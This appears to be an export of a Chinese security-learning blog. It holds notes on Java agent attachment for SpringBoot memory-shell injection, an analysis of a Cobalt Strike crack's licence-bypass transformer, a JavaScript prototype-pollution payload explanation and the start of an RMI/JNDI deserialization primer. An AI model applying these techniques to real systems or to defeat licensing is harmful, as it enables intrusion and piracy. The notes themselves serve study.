<h3 id="启动时com-sun-tools-not-found"><a href="#启动时com-sun-tools-not-found" class="headerlink" title="启动时com.sun.tools not found"></a>启动时com.sun.tools not found</h3><p>最先踩的坑是maven引入不了<code>com.sun.tools</code>这个包（理论上来说com.sun不应该是属于究极自带的包吗。。。）然后通过谷歌解决</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.sun<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>system<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>systemPath</span><span class="token punctuation">></span></span>${java.home}/../lib/tools.jar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>systemPath</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
</code></pre>
<p>然后打包到jar（说起来这个打包的时候也没把tools.jar打包进去，伏笔）</p>
<p>运行时超级报错AttachNotSupportedException Class not found。继续谷歌，说需要加一个buff，指定路径吧就<br><code>-Xbootclasspath/a:D:\Java\jdk\jre1.8.1_311\lib\tools.jar</code><br>说起来我并不是很清楚我的java环境安装时发生了什么，我装的是jdk，然后安装过程中又单独让我再装一个jre，然后我的jdk里面有一个完整的jre，又有一个单独的jre，然后把我的环境变量指向了jre。嗯？</p>
<p>然后发现jdk下面的jre里有tools.jar，把他复制出来放到jre1.8.1_311下。。。太怪了</p>
<p>然后继续报错<code>Provider sun.tools.attach.WindowsAttachProvider could not be instant</code></p>
<p>搜一下说是又缺dll，估计是已经到了native method的地步了。然后继续把jdk下的jre里的bin下的dll复制到外面的jre的bin目录下，跑起来了。感觉，是不是当初装环境的时候直接不装那个jre就用jdk下的jre然后环境变量也是对的就没有这么多复制粘贴的事了，所以当初那个官方installer为什么要单独又整一个jre呢？</p>
<p>然后使用这么长的buff成功把agentmain attach上去了</p>
<pre class=" language-sh"><code class="language-sh">java -Xbootclasspath/a:D:\Java\jdk\jre1.8.1_311\lib\tools.jar -cp JavaAgentTest.jar org.z33.agenttest.Attacher 20 236 D:\Java\projects\JavaAgentTest\out\artifacts\JavaAgentTest_jar\JavaAgentTest.jar
</code></pre>
<p>这里还是有几个小坑，比如attach时指定的这个路径是相对于正在运行的java应用的，而不是我们的attacher，所以最好直接填绝对路径。毕竟是先attach到应用的jvm上再去load agent，所以应当如此</p>
<p>还有一个点是load了这个agent之后还是可以重复load，但是每load一次只是重新调用一遍agentmain方法，就算重新修改了agentmain方法再重新load也不会修改掉已经load进内存的agent，只是重新触发</p>
<p>解决了运行坑继续踩依赖坑</p>
<h3 id="idea顶部栏和maven编译不同"><a href="#idea顶部栏和maven编译不同" class="headerlink" title="idea顶部栏和maven编译不同"></a>idea顶部栏和maven编译不同</h3><p>因为写的简单hello world肯定不会自带javassist依赖，所以注入之后究极报错class not found。我一开始还在想我在maven中添加依赖了啊，为什么跑不起来呢。然后直接解压打包的jar，发现里面一无所有。经过简单的思索（排队打卡的时候无聊），我意识到可能idea顶部栏的build artifacts和maven的package可能不是一个东西。伏笔回收。原来还有这种事情，我是傻逼</p>
<p>简单搜索并配置后使用maven的package操作完成带依赖打包</p>
<p>带依赖打包的方法挺多的，随便复制粘贴一个（这里是将被注入的jar包把依赖打进去，agent那个jar包其实不需要打依赖，本身就不是在这里运行）</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-assembly-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">></span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>single<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>archive</span><span class="token punctuation">></span></span>
                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifest</span><span class="token punctuation">></span></span>
                                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">></span></span>
                                        com.z33.test.Demo
                                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">></span></span>
                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifest</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>archive</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRefs</span><span class="token punctuation">></span></span>
                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRef</span><span class="token punctuation">></span></span>jar-with-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRef</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRefs</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span>
</code></pre>
<p>从此以后只用maven配置的打包。。。果然还是要动手，顺便添加一下mainclass，免得次次-cp指定半天</p>
<p>然后如果要用maven打包agent的话，原来写的MANIFEST.MF也没用了，可以通过两种方式进行魔改，一个是再引用一下之前写的MF，另一个是直接写配置项，直接引一下写好的吧。配置项花里胡哨的写一堆挺麻烦</p>
<pre class=" language-xml"><code class="language-xml">            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-jar-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>archive</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifestFile</span><span class="token punctuation">></span></span>src/main/resources/META-INF/MANIFEST.MF<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifestFile</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>archive</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span>
</code></pre>
<h3 id="maven-package使agent无效"><a href="#maven-package使agent无效" class="headerlink" title="maven package使agent无效"></a>maven package使agent无效</h3><p>躺了一会，又踩了一个非常奇怪的坑。用上述maven操作打包的jar包无法被识别为agent包。报错和ha1师傅的并不一致，直接是无法打开或没有agent属性。简单看了下用顶部栏build的包和maven build的包的区别，MANIFEST.MF差不多一致，但maven编译的在META-INF下多一个maven目录。然后把他删了就又能把maven编译的这个jar当agent用了。什么玩意啊？<br>然后把maven里关于MANIFEST的配置从手写entry改成引用已经写好的MANIFEST重新package了一下又行了。并且也不用删那个maven目录了。并不知道发生了什么，但大抵就是很玄幻，未细究。。。。太奇怪了就</p>
<h3 id="MANIFEST具体配置"><a href="#MANIFEST具体配置" class="headerlink" title="MANIFEST具体配置"></a>MANIFEST具体配置</h3><p>似乎没有看到谁有提到过要加这句的，但是我在SpringBoot环境下不加这句会显示<code>adding retransformable transformers is not supported in this environment</code>，所以加上<code>Can-Retransform-Classes: true</code></p>
<h3 id="严肃的问题"><a href="#严肃的问题" class="headerlink" title="严肃的问题"></a>严肃的问题</h3><p>如果远程环境没有自带javassist怎么办。。。。无论是一开始的简单hello测试，还是后来的SpringBoot内存马注入，都是我手动引入了javassist的。（一开始以为SprintBoot这种大框架可能内置了没引入，打了半天打不动，并且也不会报错说class not found，最后感觉这里有问题加了依赖才打通）<br>这个如果本身不属于jdk自带的依赖也没法像上面的反射加载tool.jar一样打啊。也没看到人提起过，麻</p>
<h3 id="解决了，我是傻逼"><a href="#解决了，我是傻逼" class="headerlink" title="解决了，我是傻逼"></a>解决了，我是傻逼</h3><p>感谢<a href="https://blog.csdn.net/rfrder">feng@Dest0g3</a>师傅的指正<br>因为agent.jar是附着到目标jvm上运行的，把javassist打包进agent.jar就行了。。。我当初还说就是因为附着运行所以不需要打包依赖呢。。。实际上缺依赖的时候自己打好包就不依赖远程了。<br>并且agent的利用本身也就需要把jar包传到远程服务器上吧？实在不行也可以再传一个lib然后用classloader加载？再不济还能urlclassloader再远程加载一下之类的吧<br>把上述打包依赖和添加MANIFEST的操作缝合一下maven打包</p>
<pre class=" language-xml"><code class="language-xml">            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-assembly-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">></span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>single<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>archive</span><span class="token punctuation">></span></span>
                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifestFile</span><span class="token punctuation">></span></span>src/main/resources/META-INF/MANIFEST.MF<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifestFile</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>archive</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRefs</span><span class="token punctuation">></span></span>
                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRef</span><span class="token punctuation">></span></span>jar-with-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRef</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRefs</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>
</code></pre>
<h2 id="看看CS的破解"><a href="#看看CS的破解" class="headerlink" title="看看CS的破解"></a>看看CS的破解</h2><p>把破解用的hook.jar拉下来反编译。也就两个类，一个hook，因为破解是启动的时候直接附着起来，所以直接写的premain，另一个类就是我们的transformer</p>
<p>直接把认证类替换成了他的字节码</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">transform</span><span class="token punctuation">(</span>ClassLoader loader<span class="token punctuation">,</span> String className<span class="token punctuation">,</span> Class <span class="token class-name">classBeingRedefined</span><span class="token punctuation">,</span> ProtectionDomain protectionDomain<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classfileBuffer<span class="token punctuation">)</span> <span class="token keyword">throws</span> IllegalClassFormatException <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"common/Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            String base64class <span class="token operator">=</span> <span class="token string">"yv66vgAAADQBCQo......"</span><span class="token punctuation">;</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Found desired class: "</span> <span class="token operator">+</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>
            classfileBuffer <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>base64class<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> classfileBuffer<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>然后还配了几个看起来像是工具的函数。写个破烂还原字节码（实际上就是把字节码写进文件再idea反编译）</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
        String base64class <span class="token operator">=</span> <span class="token string">"yv66vgAAAD......."</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>base64class<span class="token punctuation">)</span><span class="token punctuation">;</span>
        FileOutputStream fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"result.class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>然后并没有看懂什么逻辑。。。在认证中还进行了一堆额外的数据分析，要我说这种东西不应该直接干什么都返回true然后时间调个forever就行了么</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript原型链污染</title>
    <url>/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html</url>
    <content><![CDATA[<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><p>大力学习js然后学到原型链把人学傻了，专门理了一下</p>
<h2 id="proto-和prototype"><a href="#proto-和prototype" class="headerlink" title="__proto__和prototype"></a>__proto__和prototype</h2><p>每个对象都存在一个__proto__属性，而每个类（js并没有很正统的类这个说法）则拥有prototype，由该类构造出来的对象的__proto__就指向该类的prototype，这都是网上可以搜到的内容，不想讲，看这个<br><a href="https://www.cnblogs.com/shuiyi/p/5305435.html">https://www.cnblogs.com/shuiyi/p/5305435.html</a></p>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>今天主要是想解决一下常见原型链污染时出现的困惑<br>常见都是先使用<code>&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;</code>这个payload再使用merge之类的函数合并进行原型链污染，而又由此牵扯出这样子创建变量导致__proto__直接被认定为属性，merge函数无法取得，需要用JSON.parse将其解析为键值进行污染。<br>我就在想，既然我已经创建出了这样子的一个对象，为什么没有直接污染原型链呢</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span>o1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token operator">></span>o2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token operator">></span>o2<span class="token punctuation">.</span>b
<span class="token operator">&lt;</span>undefined
<span class="token operator">></span>o1<span class="token punctuation">.</span>__proto__
<span class="token operator">&lt;</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span>
    b<span class="token punctuation">:</span> <span class="token number">1</span>
    __proto__<span class="token punctuation">:</span> Object
</code></pre>
<p>这里使用这样子的方式进行赋值，__proto__的确是一个属性而不是一个键值对，但是__proto__[b]&#x3D;1却并没有污染到原型链，按照我一开始的理解，这样子应该是直接修改了object的prototype的，因为o1.__proto__&#x3D;&#x3D;&#x3D;Object.prototype，但事实上，这个方式事实上是像下面这种赋值语句一样，把o1的__proto__赋值给了其他对象，并没有取得Object的prototype</p>
<pre class=" language-JavaScript"><code class="language-JavaScript">>b = {"c":2}
<{c: 2}
>o1 = {}
<{}
>o1.__proto__ 
<{constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}
>o1.__proto__ = b
<{c: 2}
>o1.__proto__ 
<{c: 2}
    c: 2
    __proto__: Object
</code></pre>
<p>而对于如下这种形式可以污染原型链，是因为修改的是__proto__下的一个属性，并不是修改__proto__的内容</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span>o2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token operator">></span>o2<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>aaa <span class="token operator">=</span> <span class="token number">1</span>
<span class="token operator">&lt;</span><span class="token number">1</span>
<span class="token operator">></span>o3 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token operator">></span>o3<span class="token punctuation">.</span>aaa
<span class="token operator">&lt;</span><span class="token number">1</span>
</code></pre>
<p>__proto__就像是一个指向原型的指针，你令__proto__&#x3D;a的时候，直接修改了这个指针的指向，自然不会影响到原型，而你使用__proto__.a&#x3D;1时，则是通过这个指针直接修改了其指向的原型中的属性</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>Java RMI反序列化与JNDI注入入门</title>
    <url>/Java%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h1 id="Java-RMI反序列化与JNDI注入入门"><a href="#Java-RMI反序列化与JNDI注入入门" class="headerlink" title="Java RMI反序列化与JNDI注入入门"></a>Java RMI反序列化与JNDI注入入门</h1><p>本来是想更新原文章的，但是学着学着发现自己之前根本没懂，写了一万个错的东西，全部推倒重来<br>真正的java漏洞分析都是无尽的代码截图和调试，我这种纯概念的文字叙述只能是记个笔记，先了解各大概</p>
<h2 id="RMI反序列化"><a href="#RMI反序列化" class="headerlink" title="RMI反序列化"></a>RMI反序列化</h2><p>主要是利用客户端，服务端以及注册中心交互过程中对象的传递进行反序列化</p>
<h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p>没什么用的环节。Remote Method Invocation，远程方法调用<br>JRMP，Java Remote Method Protocol，Java远程方法协议，是Java RMI过程中使用的一种协议</p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>项目结构如下<br><img src="/images/JavaRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/structure.png" alt="structure.png"><br>一般来说RMI中有三个主要成员，Server，Client和Registry，Registry提供一个记录和注册的服务，Server负责注册在Registry上方法的具体实现，而Client就只需要查找Registry中的方法然后调用。</p>
<p>理论上Server和Registry是可以分开的，不过在jdk某个版本之后进行了安全检查，要求注册中心和服务端是同一台机器，否则不给绑定</p>
<p>客户端只需要知道远程提供服务的路径，通过list，lookup等方法去获取一个远程调用的类对象的代理类，对代理类进行方法调用，就转换到将类名方法参数传递到服务端，由服务端查找类方法并进行调用，最后返回得到的结果</p>
<p>整个调用的过程就是服务端运行一个Skeleton（骨架），类的实现之类的都在服务端，而客户端进行远程方法调用的时候，服务端就返回一个Stub（存根），实际上返回的是远程调用类的一个代理对象，其invoke方法就是将参数进行一个序列化，然后发到服务端，服务端收到参数后在本地执行对应的方法，并将执行结果返回给客户端</p>
<h3 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h3><p>HelloClient.java</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>client<span class="token punctuation">;</span>

<span class="token keyword">import</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>HelloInterface<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>NotBoundException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloClient</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            HelloInterface hello <span class="token operator">=</span> <span class="token punctuation">(</span>HelloInterface<span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hello<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"z33"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotBoundException</span> <span class="token operator">|</span> RemoteException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>HelloServer.java</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>server<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>AlreadyBoundException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServer</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">HelloImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server ready"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
